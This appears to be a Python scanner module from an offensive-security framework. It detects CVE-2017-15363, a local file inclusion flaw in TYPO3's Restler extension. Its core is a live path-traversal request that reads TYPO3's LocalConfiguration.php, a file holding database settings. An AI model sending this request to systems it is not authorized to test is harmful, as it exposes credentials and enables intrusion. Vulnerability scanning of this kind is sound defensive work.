#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Luracast Restler 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Luracast Restler 3.0.1 via TYPO3 Restler 1.7.1 - Local File Inclusion Detection',
        'description': 'Luracast Restler 3.0.1 via TYPO3 Restler 1.7.1 is susceptible to local file inclusion in public/examples/resources/getsource.php. This could allow remote attackers to read arbitrary files via the file parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'restler', 'lfi', 'edb', 'luracast', 'typo3', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/42985',
            'https://extensions.typo3.org/extension/restler/',
            'https://extensions.typo3.org/extension/download/restler/1.7.1/zip/',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-15363',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2017-15363',
    }

    def run(self):
        r = self.http_request(method="GET", path='/typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<?php', "'host'", "'database'", "'extConf'", "'debug'",)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Luracast Restler 3.0.1 via TYPO3 Restler 1.7.1 - Local File Inclusion detected",
                path='/typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php',
            )
            return True
        return False

